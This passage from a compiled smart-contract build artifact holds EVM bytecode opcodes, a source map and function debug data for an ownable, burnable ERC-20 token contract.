SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x971 DUP3 PUSH1 0x0 DUP4 PUSH2 0xB4C JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x9E7 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0xE602DF0500000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x9DE SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0xA59 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0x94280D6200000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xA50 SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP2 PUSH1 0x1 PUSH1 0x0 DUP7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP1 ISZERO PUSH2 0xB46 JUMPI DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 DUP5 PUSH1 0x40 MLOAD PUSH2 0xB3D SWAP2 SWAP1 PUSH2 0xF41 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0xB9E JUMPI DUP1 PUSH1 0x2 PUSH1 0x0 DUP3 DUP3 SLOAD PUSH2 0xB92 SWAP2 SWAP1 PUSH2 0x1185 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH2 0xC71 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP DUP2 DUP2 LT ISZERO PUSH2 0xC2A JUMPI DUP4 DUP2 DUP4 PUSH1 0x40 MLOAD PUSH32 0xE450D38C00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xC21 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x114E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP2 DUP2 SUB PUSH1 0x0 DUP1 DUP7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP POP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0xCBA JUMPI DUP1 PUSH1 0x2 PUSH1 0x0 DUP3 DUP3 SLOAD SUB SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH2 0xD07 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMPDEST DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD PUSH2 0xD64 SWAP2 SWAP1 PUSH2 0xF41 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xDAB JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xD90 JUMP JUMPDEST PUSH1 0x0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xDD3 DUP3 PUSH2 0xD71 JUMP JUMPDEST PUSH2 0xDDD DUP2 DUP6 PUSH2 0xD7C JUMP JUMPDEST SWAP4 POP PUSH2 0xDED DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0xD8D JUMP JUMPDEST PUSH2 0xDF6 DUP2 PUSH2 0xDB7 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0xE1B DUP2 DUP5 PUSH2 0xDC8 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xE53 DUP3 PUSH2 0xE28 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xE63 DUP2 PUSH2 0xE48 JUMP JUMPDEST DUP2 EQ PUSH2 0xE6E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0xE80 DUP2 PUSH2 0xE5A JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xE99 DUP2 PUSH2 0xE86 JUMP JUMPDEST DUP2 EQ PUSH2 0xEA4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0xEB6 DUP2 PUSH2 0xE90 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0xED3 JUMPI PUSH2 0xED2 PUSH2 0xE23 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xEE1 DUP6 DUP3 DUP7 ADD PUSH2 0xE71 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0xEF2 DUP6 DUP3 DUP7 ADD PUSH2 0xEA7 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xF11 DUP2 PUSH2 0xEFC JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0xF2C PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0xF08 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0xF3B DUP2 PUSH2 0xE86 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0xF56 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0xF32 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0xF75 JUMPI PUSH2 0xF74 PUSH2 0xE23 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xF83 DUP7 DUP3 DUP8 ADD PUSH2 0xE71 JUMP JUMPDEST SWAP4 POP POP PUSH1 0x20 PUSH2 0xF94 DUP7 DUP3 DUP8 ADD PUSH2 0xE71 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x40 PUSH2 0xFA5 DUP7 DUP3 DUP8 ADD PUSH2 0xEA7 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 0x0 PUSH1 0xFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xFC5 DUP2 PUSH2 0xFAF JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0xFE0 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0xFBC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xFFC JUMPI PUSH2 0xFFB PUSH2 0xE23 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x100A DUP5 DUP3 DUP6 ADD PUSH2 0xE71 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x101C DUP2 PUSH2 0xE48 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1037 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1013 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x1054 JUMPI PUSH2 0x1053 PUSH2 0xE23 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x1062 DUP6 DUP3 DUP7 ADD PUSH2 0xE71 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x1073 DUP6 DUP3 DUP7 ADD PUSH2 0xE71 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x2 DUP3 DIV SWAP1 POP PUSH1 0x1 DUP3 AND DUP1 PUSH2 0x10C4 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH2 0x10D7 JUMPI PUSH2 0x10D6 PUSH2 0x107D JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x1117 DUP3 PUSH2 0xE86 JUMP JUMPDEST SWAP2 POP PUSH2 0x1122 DUP4 PUSH2 0xE86 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH2 0x1130 DUP2 PUSH2 0xE86 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH2 0x1147 JUMPI PUSH2 0x1146 PUSH2 0x10DD JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x1163 PUSH1 0x0 DUP4 ADD DUP7 PUSH2 0x1013 JUMP JUMPDEST PUSH2 0x1170 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0xF32 JUMP JUMPDEST PUSH2 0x117D PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0xF32 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1190 DUP3 PUSH2 0xE86 JUMP JUMPDEST SWAP2 POP PUSH2 0x119B DUP4 PUSH2 0xE86 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0x11B3 JUMPI PUSH2 0x11B2 PUSH2 0x10DD JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xDA PUSH5 0x986EFE334F CREATE2 DUP4 PUSH28 0x986DB8A789595EF8A676806085E4AC809B5C5513312F64736F6C6343 STOP ADDMOD ISZERO STOP CALLER ","sourceMap":"220:427:8:-:0;;;273:252;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;363:10;1896:113:2;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1970:5;1962;:13;;;;;;:::i;:::-;;1995:7;1985;:17;;;;;;:::i;:::-;;1896:113;;1297:1:0;1273:26;;:12;:26;;;1269:95;;1350:1;1322:31;;;;;;;;;;;:::i;:::-;;;;;;;;1269:95;1373:32;1392:12;1373:18;;;:32;;:::i;:::-;1225:187;411:45:8::2;417:10;446:8;429:13;:26;;;;:::i;:::-;411:5;;;:45;;:::i;:::-;466:52;474:15;508:8;491:13;:26;;;;:::i;:::-;466:7;;;:52;;:::i;:::-;;273:252:::0;;220:427;;2912:187:0;2985:16;3004:6;;;;;;;;;;;2985:25;;3029:8;3020:6;;:17;;;;;;;;;;;;;;;;;;3083:8;3052:40;;3073:8;3052:40;;;;;;;;;;;;2975:124;2912:187;:::o;7721:208:2:-;7810:1;7791:21;;:7;:21;;;7787:91;;7864:1;7835:32;;;;;;;;;;;:::i;:::-;;;;;;;;7787:91;7887:35;7903:1;7907:7;7916:5;7887:7;;;:35;;:::i;:::-;7721:208;;:::o;4293:186::-;4366:4;4382:13;4398:12;:10;;;:12;;:::i;:::-;4382:28;;4420:31;4429:5;4436:7;4445:5;4420:8;;;:31;;:::i;:::-;4468:4;4461:11;;;4293:186;;;;:::o;6271:1107::-;6376:1;6360:18;;:4;:18;;;6356:540;;6512:5;6496:12;;:21;;;;;;;:::i;:::-;;;;;;;;6356:540;;;6548:19;6570:9;:15;6580:4;6570:15;;;;;;;;;;;;;;;;6548:37;;6617:5;6603:11;:19;6599:115;;;6674:4;6680:11;6693:5;6649:50;;;;;;;;;;;;;:::i;:::-;;;;;;;;6599:115;6866:5;6852:11;:19;6834:9;:15;6844:4;6834:15;;;;;;;;;;;;;;;:37;;;;6534:362;6356:540;6924:1;6910:16;;:2;:16;;;6906:425;;7089:5;7073:12;;:21;;;;;;;;;;;6906:425;;;7301:5;7284:9;:13;7294:2;7284:13;;;;;;;;;;;;;;;;:22;;;;;;;;;;;6906:425;7361:2;7346:25;;7355:4;7346:25;;;7365:5;7346:25;;;;;;:::i;:::-;;;;;;;;6271:1107;;;:::o;656:96:5:-;709:7;735:10;728:17;;656:96;:::o;8989:128:2:-;9073:37;9082:5;9089:7;9098:5;9105:4;9073:8;;;:37;;:::i;:::-;8989:128;;;:::o;9949:432::-;10078:1;10061:19;;:5;:19;;;10057:89;;10132:1;10103:32;;;;;;;;;;;:::i;:::-;;;;;;;;10057:89;10178:1;10159:21;;:7;:21;;;10155:90;;10231:1;10203:31;;;;;;;;;;;:::i;:::-;;;;;;;;10155:90;10284:5;10254:11;:18;10266:5;10254:18;;;;;;;;;;;;;;;:27;10273:7;10254:27;;;;;;;;;;;;;;;:35;;;;10303:9;10299:76;;;10349:7;10333:31;;10342:5;10333:31;;;10358:5;10333:31;;;;;;:::i;:::-;;;;;;;;10299:76;9949:432;;;;:::o;88:117:10:-;197:1;194;187:12;334:77;371:7;400:5;389:16;;334:77;;;:::o;417:122::-;490:24;508:5;490:24;:::i;:::-;483:5;480:35;470:63;;529:1;526;519:12;470:63;417:122;:::o;545:143::-;602:5;633:6;627:13;618:22;;649:33;676:5;649:33;:::i;:::-;545:143;;;;:::o;694:126::-;731:7;771:42;764:5;760:54;749:65;;694:126;;;:::o;826:96::-;863:7;892:24;910:5;892:24;:::i;:::-;881:35;;826:96;;;:::o;928:122::-;1001:24;1019:5;1001:24;:::i;:::-;994:5;991:35;981:63;;1040:1;1037;1030:12;981:63;928:122;:::o;1056:143::-;1113:5;1144:6;1138:13;1129:22;;1160:33;1187:5;1160:33;:::i;:::-;1056:143;;;;:::o;1205:507::-;1284:6;1292;1341:2;1329:9;1320:7;1316:23;1312:32;1309:119;;;1347:79;;:::i;:::-;1309:119;1467:1;1492:64;1548:7;1539:6;1528:9;1524:22;1492:64;:::i;:::-;1482:74;;1438:128;1605:2;1631:64;1687:7;1678:6;1667:9;1663:22;1631:64;:::i;:::-;1621:74;;1576:129;1205:507;;;;;:::o;1718:99::-;1770:6;1804:5;1798:12;1788:22;;1718:99;;;:::o;1823:180::-;1871:77;1868:1;1861:88;1968:4;1965:1;1958:15;1992:4;1989:1;1982:15;2009:180;2057:77;2054:1;2047:88;2154:4;2151:1;2144:15;2178:4;2175:1;2168:15;2195:320;2239:6;2276:1;2270:4;2266:12;2256:22;;2323:1;2317:4;2313:12;2344:18;2334:81;;2400:4;2392:6;2388:17;2378:27;;2334:81;2462:2;2454:6;2451:14;2431:18;2428:38;2425:84;;2481:18;;:::i;:::-;2425:84;2246:269;2195:320;;;:::o;2521:141::-;2570:4;2593:3;2585:11;;2616:3;2613:1;2606:14;2650:4;2647:1;2637:18;2629:26;;2521:141;;;:::o;2668:93::-;2705:6;2752:2;2747;2740:5;2736:14;2732:23;2722:33;;2668:93;;;:::o;2767:107::-;2811:8;2861:5;2855:4;2851:16;2830:37;;2767:107;;;;:::o;2880:393::-;2949:6;2999:1;2987:10;2983:18;3022:97;3052:66;3041:9;3022:97;:::i;:::-;3140:39;3170:8;3159:9;3140:39;:::i;:::-;3128:51;;3212:4;3208:9;3201:5;3197:21;3188:30;;3261:4;3251:8;3247:19;3240:5;3237:30;3227:40;;2956:317;;2880:393;;;;;:::o;3279:60::-;3307:3;3328:5;3321:12;;3279:60;;;:::o;3345:142::-;3395:9;3428:53;3446:34;3455:24;3473:5;3455:24;:::i;:::-;3446:34;:::i;:::-;3428:53;:::i;:::-;3415:66;;3345:142;;;:::o;3493:75::-;3536:3;3557:5;3550:12;;3493:75;;;:::o;3574:269::-;3684:39;3715:7;3684:39;:::i;:::-;3745:91;3794:41;3818:16;3794:41;:::i;:::-;3786:6;3779:4;3773:11;3745:91;:::i;:::-;3739:4;3732:105;3650:193;3574:269;;;:::o;3849:73::-;3894:3;3849:73;:::o;3928:189::-;4005:32;;:::i;:::-;4046:65;4104:6;4096;4090:4;4046:65;:::i;:::-;3981:136;3928:189;;:::o;4123:186::-;4183:120;4200:3;4193:5;4190:14;4183:120;;;4254:39;4291:1;4284:5;4254:39;:::i;:::-;4227:1;4220:5;4216:13;4207:22;;4183:120;;;4123:186;;:::o;4315:543::-;4416:2;4411:3;4408:11;4405:446;;;4450:38;4482:5;4450:38;:::i;:::-;4534:29;4552:10;4534:29;:::i;:::-;4524:8;4520:44;4717:2;4705:10;4702:18;4699:49;;;4738:8;4723:23;;4699:49;4761:80;4817:22;4835:3;4817:22;:::i;:::-;4807:8;4803:37;4790:11;4761:80;:::i;:::-;4420:431;;4405:446;4315:543;;;:::o;4864:117::-;4918:8;4968:5;4962:4;4958:16;4937:37;;4864:117;;;;:::o;4987:169::-;5031:6;5064:51;5112:1;5108:6;5100:5;5097:1;5093:13;5064:51;:::i;:::-;5060:56;5145:4;5139;5135:15;5125:25;;5038:118;4987:169;;;;:::o;5161:295::-;5237:4;5383:29;5408:3;5402:4;5383:29;:::i;:::-;5375:37;;5445:3;5442:1;5438:11;5432:4;5429:21;5421:29;;5161:295;;;;:::o;5461:1395::-;5578:37;5611:3;5578:37;:::i;:::-;5680:18;5672:6;5669:30;5666:56;;;5702:18;;:::i;:::-;5666:56;5746:38;5778:4;5772:11;5746:38;:::i;:::-;5831:67;5891:6;5883;5877:4;5831:67;:::i;:::-;5925:1;5949:4;5936:17;;5981:2;5973:6;5970:14;5998:1;5993:618;;;;6655:1;6672:6;6669:77;;;6721:9;6716:3;6712:19;6706:26;6697:35;;6669:77;6772:67;6832:6;6825:5;6772:67;:::i;:::-;6766:4;6759:81;6628:222;5963:887;;5993:618;6045:4;6041:9;6033:6;6029:22;6079:37;6111:4;6079:37;:::i;:::-;6138:1;6152:208;6166:7;6163:1;6160:14;6152:208;;;6245:9;6240:3;6236:19;6230:26;6222:6;6215:42;6296:1;6288:6;6284:14;6274:24;;6343:2;6332:9;6328:18;6315:31;;6189:4;6186:1;6182:12;6177:17;;6152:208;;;6388:6;6379:7;6376:19;6373:179;;;6446:9;6441:3;6437:19;6431:26;6489:48;6531:4;6523:6;6519:17;6508:9;6489:48;:::i;:::-;6481:6;6474:64;6396:156;6373:179;6598:1;6594;6586:6;6582:14;6578:22;6572:4;6565:36;6000:611;;;5963:887;;5553:1303;;;5461:1395;;:::o;6862:118::-;6949:24;6967:5;6949:24;:::i;:::-;6944:3;6937:37;6862:118;;:::o;6986:222::-;7079:4;7117:2;7106:9;7102:18;7094:26;;7130:71;7198:1;7187:9;7183:17;7174:6;7130:71;:::i;:::-;6986:222;;;;:::o;7214:180::-;7262:77;7259:1;7252:88;7359:4;7356:1;7349:15;7383:4;7380:1;7373:15;7400:410;7440:7;7463:20;7481:1;7463:20;:::i;:::-;7458:25;;7497:20;7515:1;7497:20;:::i;:::-;7492:25;;7552:1;7549;7545:9;7574:30;7592:11;7574:30;:::i;:::-;7563:41;;7753:1;7744:7;7740:15;7737:1;7734:22;7714:1;7707:9;7687:83;7664:139;;7783:18;;:::i;:::-;7664:139;7448:362;7400:410;;;;:::o;7816:191::-;7856:3;7875:20;7893:1;7875:20;:::i;:::-;7870:25;;7909:20;7927:1;7909:20;:::i;:::-;7904:25;;7952:1;7949;7945:9;7938:16;;7973:3;7970:1;7967:10;7964:36;;;7980:18;;:::i;:::-;7964:36;7816:191;;;;:::o;8013:118::-;8100:24;8118:5;8100:24;:::i;:::-;8095:3;8088:37;8013:118;;:::o;8137:442::-;8286:4;8324:2;8313:9;8309:18;8301:26;;8337:71;8405:1;8394:9;8390:17;8381:6;8337:71;:::i;:::-;8418:72;8486:2;8475:9;8471:18;8462:6;8418:72;:::i;:::-;8500;8568:2;8557:9;8553:18;8544:6;8500:72;:::i;:::-;8137:442;;;;;;:::o;8585:222::-;8678:4;8716:2;8705:9;8701:18;8693:26;;8729:71;8797:1;8786:9;8782:17;8773:6;8729:71;:::i;:::-;8585:222;;;;:::o;220:427:8:-;;;;;;;"},"deployedBytecode":{"functionDebugData":{"@_approve_690":{"entryPoint":1548,"id":690,"parameterSlots":3,"returnSlots":0},"@_approve_750":{"entryPoint":2421,"id":750,"parameterSlots":4,"returnSlots":0},"@_burn_672":{"entryPoint":2291,"id":672,"parameterSlots":2,"returnSlots":0},"@_checkOwner_84":{"entryPoint":1958,"id":84,"parameterSlots":0,"returnSlots":0},"@_msgSender_915":{"entryPoint":1540,"id":915,"parameterSlots":0,"returnSlots":1},"@_spendAllowance_798":{"entryPoint":1566,"id":798,"parameterSlots":3,"returnSlots":0},"@_transferOwnership_146":{"entryPoint":2093,"id":146,"parameterSlots":1,"returnSlots":0},"@_transfer_529":{"entryPoint":1714,"id":529,"parameterSlots":3,"returnSlots":0},"@_update_606":{"entryPoint":2892,"id":606,"parameterSlots":3,"returnSlots":0},"@allowance_426":{"entryPoint":1271,"id":426,"parameterSlots":2,"returnSlots":1},"@approve_450":{"entryPoint":814,"id":450,"parameterSlots":2,"returnSlots":1},"@balanceOf_385":{"entryPoint":915,"id":385,"parameterSlots":1,"returnSlots":1},"@burn_2017":{"entryPoint":1195,"id":2017,"parameterSlots":2,"returnSlots":0},"@decimals_363":{"entryPoint":906,"id":363,"parameterSlots":0,"returnSlots":1},"@name_345":{"entryPoint":668,"id":345,"parameterSlots":0,"returnSlots":1},"@owner_67":{"entryPoint":1007,"id":67,"parameterSlots":0,"returnSlots":1},"@renounceOwnership_98":{"entryPoint":987,"id":98,"parameterSlots":0,"returnSlots":0},"@symbol_354":{"entryPoint":1049,"id":354,"parameterSlots":0,"returnSlots":1},"@totalSupply_372":{"entryPoint":849,"id":372,"parameterSlots":0,"returnSlots":1},"@transferFrom_482":{"entryPoint":859,"id":482,"parameterSlots":3,"returnSlots":1},"@transferOwnership_126":{"entryPoint":1406,"id":126,"parameterSlots":1,"returnSlots":0},"@transfer_409":{"entryPoint":1236,"id":409,"parameterSlots":2,"returnSlots":1},"abi_decode_t_address":{"entryPoint":3697,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_t_uint256":{"entryPoint":3751,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_address":{"entryPoint":4070,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_addresst_address":{"entryPoint":4157,"id":null,"parameterSlots":2,"returnSlots":2},"abi_decode_tuple_t_addresst_addresst_uint256":{"entryPoint":3932,"id":null,"parameterSlots":2,"returnSlots":3},"abi_decode_tuple_t_addresst_uint256":{"entryPoint":3772,"id":null,"parameterSlots":2,"returnSlots":2},"abi_encode_t_address_to_t_address_fromStack":{"entryPoint":4115,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_t_bool_to_t_bool_fromStack":{"entryPoint":3848,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack":{"entryPoint":3528,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_t_uint256_to_t_uint256_fromStack":{"entryPoint":3890,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_t_uint8_to_t_uint8_fromStack":{"entryPoint":4028,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_tuple_t_address__to_t_address__fromStack_reversed":{"entryPoint":4130,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_address_t_uint256_t_uint256__to_t_address_t_uint256_t_uint256__fromStack_reversed":{"entryPoint":4430,"id":null,"parameterSlots":4,"returnSlots":1},"abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed":{"entryPoint":3863,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_string_memory_ptr__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":3585,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed":{"entryPoint":3905,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_uint8__to_t_uint8__fromStack_reversed":{"entryPoint":4043,"id":null,"parameterSlots":2,"returnSlots":1},"allocate_unbounded":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":1},"array_length_t_string_memory_ptr":{"entryPoint":3441,"id":null,"parameterSlots":1,"returnSlots":1},"array_storeLengthForEnco